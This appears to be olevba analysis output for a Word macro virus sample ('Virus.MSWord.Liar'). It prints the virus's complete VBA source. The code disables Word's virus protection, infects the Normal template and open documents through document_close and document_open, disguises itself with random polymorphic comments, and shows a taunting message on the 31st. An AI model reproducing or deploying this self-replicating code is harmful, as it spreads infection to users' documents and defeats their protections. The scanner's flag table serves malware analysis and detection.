olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar-526bd033c60da27ee85b388a71fccb2b2f8bbae1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar-526bd033c60da27ee85b388a71fccb2b2f8bbae1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_close() 'КЖгбІюі®№ыЦ©°ЪџЁъЎЫЛіъДСвБїед­­Еќ¤йєќзКхњјюЖхх°гывЩбЎћЧдппїЦ
Dim v(150): Options.VirusProtection = False 'ЯЯуПЙАКСмп·°Іќ±зіиїхтЙ№йуі¶ЫжҐњ°ЖЭѕшйвХсуПХєшфЫ» шЁибЪйБњ§п
'ЯЯуПЙАКСмп·°Іќ±зіиїхтЙ№йуі¶ЫжҐњ°ЖЭѕшйвХсуПХєшфЫ» шЁибЪйБњ§п
Set a = MacroContainer.VBProject: Set ab = a.VBComponents(1) 'зыХЭцдЅтМҐа®ґКАПсС±ФЮшєёёРхҐрЩЈчЎе°рџґ¤бмзт®Щ®дыњЪ№№ХэсЧС¶®ЪќоЅРҐЎы
'зыХЭцдЅтМҐа®ґКАПсС±ФЮшєёёРхҐрЩЈчЎе°рџґ¤бмзт®Щ®дыњЪ№№ХэсЧС¶®ЪќоЅРҐЎы
Set abc = ab.CodeModule: Set s = NormalTemplate: t = Chr(39) 'ЁПІз¶іАІщгІИЩДЯґМжЦКдҐў±ЯДЗыЬЬю·ХэЗЗїЬ­ЯщвёµіГЇ·Яѕґ¬ЩКу ВЫЪеІ©тХол·
Set nh = s.VBProject.VBComponents(1).CodeModule 'ш¦СЕќҐСЇҐ»ґйюРеЬ©СҐ®АўСО¶Ц§ЈјжЅ¦ъШЖЦяЬБІАНињњД¶УыНьёъгИ°уШОФшкз±РЄшЮњ
For y = 1 To Int(75 - (Rnd * 20)): vx = vx & Chr(255 - Int(Rnd * 100)): Next y 'џћІЕФзср зіґцгТУ мДјОчБ·иП°ЫфАмЁѕъылаХпХрГіСµќРьзчЗ¬§ЬМяМиµЄЗЗѕ±уъ«ОЦн»Т
vc = "Sub document_close()" & t & vx & vbCr 'ъЕХ®Ыиџџ®ЫЩЛ¤я¤¦ж ФУНґЅфє©Мм·сІУрМўЦо Щњ¦»±д©В№Г¬щЛўІєКШу¶ЧцЮЧµзГѕыТЈ
If MacroContainer = NormalTemplate Then 'аЯмЄзЩґнЛьДГ»НМьы»О©ЙКсЙ¬ўЦЙЕѕЗТцАбЩцМаВ®ЫЎСЫ¶хУи§ЙЅлЬеФЫЅк
Set s = ActiveDocument: Set nh = s.VBProject.VBComponents(1).CodeModule 'ЩеЅПЫЦрРгйвАЪЛ§ВРШьфдаД¶­јёяЮФ­ґсхёїыўЎщ·ЫОтДµАцІдц«ЪмХ±ќгѕҐРНпцќ
vc = "Sub document_open()" & t & vx & vbCr '·мдЛОЄЅОРЙяМСѕѕҐЖёД юЄњЙйВ®эр¤«Ч¦Ь¬єФ·яЕЇґ·вЩсФµТ­Ј шР№ѕф
'·мдЛОЄЅОРЙяМСѕѕҐЖёД юЄњЙйВ®эр¤«Ч¦Ь¬єФ·яЕЇґ·вЩсФµТ­Ј шР№ѕф
End If: Randomize: lin = abc.countoflines 'пДћЙВгщэйКЬаьгІгґОгКҐѕзЕкБЁЮе·эЇШълюІч¬ж¦У±ОтшфујРхЄїЮНћНЯч
For i = 2 To lin 'йЬвСлВроХкЈО«ьУпЯЯВ«џБвеБтМГ­тџрІ®ѕо№еЁчС·ФЇЫсшЦл¤мыБ¦іыёЅВб°
'йЬвСлВроХкЈО«ьУпЯЯВ«џБвеБтМГ­тџрІ®ѕо№еЁчС·ФЇЫсшЦл¤мыБ¦іыёЅВб°
jc = "": d = Int(Rnd * 3): p = InStr(abc.Lines(i, 1), t) 'ћМўгбмрч°Ъ¦лДјсвс«ФзъфЈнж¶БЅЩ©§уФГиВАЮЮјЕбдАѕФъяїХЧнїчіФнЄЙ
If p = 0 Then GoTo e_ 'ёїЈЇкеэЎ°¬З·ЧЪтівЈфлцЫЦВнФУфй жЇњЪшЪПКЈяк»ЅН¬¶х№ҐіЛхя«Ь·цћхЯяШ
If p = 1 And lin > 100 Then 'ЬхРЦЖД¶Ве¤Ёкґ§ еЈБрВЯЫШІУЧЯцЭЩИфТЄыкїћЄИДИцуаЬцкюК¦эмРЎЙҐґэ№
d = 1: GoTo n_ 'П° Ѕ»ъЄнєЕЄїиМЅј¤Ю¬МЅГІ»Ц°тшцУЬп®ИНЖбкЬ±їМ№млјќЩ«ЦьДЬѕйЙлЮ±ЩУДЯюў
End If 'ДЇћвгтхЇж¤ЁЧядие­§У№Ж·ЈН№ќХОЙдЩЩІцВ«йЙс®ЄеЧхшВЖмкпжЫбШЬ чВй
v(i) = Left(abc.Lines(i, 1), (p - 1)) 'кэьсчЦртбЦЩэрЙйуелР®чЪЫдДЦЇЙздюІнЄЬ·ЅЅЩЙЇєп±НЗ¤»їЈіАЗшЄяµ©єу±«»КЖѕюИі
For j = 1 To Int(75 - (Rnd * 20))  'ќСі­нкіЬгрНё·НїњыжНг«сиох°кЅѕдБлњ»ЦюинХјУм¶ћхЇЬЎҐКхиµк·Аяевџш
jc = jc & Chr(255 - Int(Rnd * 100)) 'фц©ЦЩќЮЇъ·оЩк®ЩН©тћТмЄҐЕкІЪ№З¬р·Ж­ЦИГСИлАБМиц§сЬ¦зќЯ­мтцч
Next j 'луџЭЦ·ёµГа»іҐЕєДчзЮњлл±ћН±®ЇЙШъсЕвОЖз·гжЫн№©оыС«єЬл¬ЯЎдЫІ·¶®квВБ
'луџЭЦ·ёµГа»іҐЕєДчзЮњлл±ћН±®ЇЙШъсЕвОЖз·гжЫн№©оыС«єЬл¬ЯЎдЫІ·¶®квВБ
v(i) = v(i) & t & jc 'СґРµшЬД©КґаоТѕЄъЛЖњджК¤бќшЩ оЪхфҐІЧЈБТчюкЬЕскУЭюЮфНЭж¤№нГПЯМ
If d = 2 Then v(i) = v(i) & vbCr & t & jc 'Їш¬ЗаХТ БдІЗдцжВ §ѕЫуа°¦ўяВџЮсШбМдвюРЧцеќЯжвјнуЗТЯМисЭЦ§ЪУ
vc = vc & v(i) & vbCr 'єњубяЪаьоэч°Ў®ЅУъЕЭ№БњЎА«ЕѕвЇс ¶ЅйџмъюЈЛєФЎўвШъ¤єФУУеКњТНлэЛюіЭ«Иќ
n_: 'СЁрЧа±кф®ёУБ§¦џмуБјВЦЮшњ± жАБФтгњГыЖЯзХ·дУЁРҐуХЭю¦ээ¬рЯц¦Щёэр·ЛбФ«В
Next i 'џхоРиЪЪьдЫа№эшЖщ®азу№ґҐУэр¬ЗеҐЧГх±©нµћиИНЯМћѕЄнЩСЖ¬жЗЦл
'џхоРиЪЪьдЫа№эшЖщ®азу№ґҐУэр¬ЗеҐЧГх±©нµћиИНЯМћѕЄнЩСЖ¬жЗЦл
e_: 'ИвпЛЎ§Ф®њкнБ№Ў¶ћ®ЮГТЧµщдБвщБёЇШжечюдґд±здВжКЕЦЁ¬ЪмЪщµнШЩяяЭЙєАВО®
'ИвпЛЎ§Ф®њкнБ№Ў¶ћ®ЮГТЧµщдБвщБёЇШжечюдґд±здВжКЕЦЁ¬ЪмЪщµнШЩяяЭЙєАВО®
If nh.countoflines < 2 Then 'пЪР¤ЖсОоуЅЗжжЙОчрҐШї жЩ©ќЩЕ№Ы¶гВ©«ЦфўсиµщћвсЫ«їПЪўгфс§«Ц
nh.AddFromString vc: s.Save 'ЗџэИМ¤эоќјО°ж·яКН­ЭЇъЩЩ«ґшфУІІэюПїВ°єДвХцЄЧї ҐДЩфЕЭџфЙ¬ј·Ї
End If 'ДёўюзъбязФЮДї ¬лґщОЙю№МЄзґЩТцДяТёьќЄіСз№ИкЇ¶ИзЈэыћЫъфРюя«ЇєкіёићК
If Day(Now()) = 31 Then MsgBox Application.UserName & "is bliemed!", 64, "Class.bliem by jacktwo lzo/meta" 'ЙўсДФы·ЫЁёю¬БиУЄ ЯряЎЮТЦќїТЁКТҐтсЅШН·у·ЅыыЙ¶К¶йБжИьАлцНмЇї
End Sub 'ј§юЙЅ©ПсцнюЬдУхґг фЮяёЧъаИ¶ёєЅ¦џўзБёсУ№ѕшїЪхЕ®њшХв¦АйєКУ®ф¤ГєБо¶­¤МбВбЯмк
Rem Another virus by Jack Twoflower [LineZer0 & Metaphase] 'ИэшР«СрЮнЎЧёЎйо¬К¬ЦмК¦ЯТћхЬАўьЫЧЪБу«кў йАкґй№чсдпсЎйМЅ©зЪїОҐющУ
'ИэшР«СрЮнЎЧёЎйо¬К¬ЦмК¦ЯТћхЬАўьЫЧЪБу«кў йАкґй№чсдпсЎйМЅ©зЪїОҐющУ
Rem Uses "bliem" polymorhic engine by Jack Twoflower 'Ч©ЪЭЩцЭїыЅЮ¦ЈФютѕуЖ¬ј їпдАФД«Йч¶ШлЬЩЮќПЁРюЭѕеУ¬фШ©ОїУњТњю»П«¦щПДїщъНЯэ

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

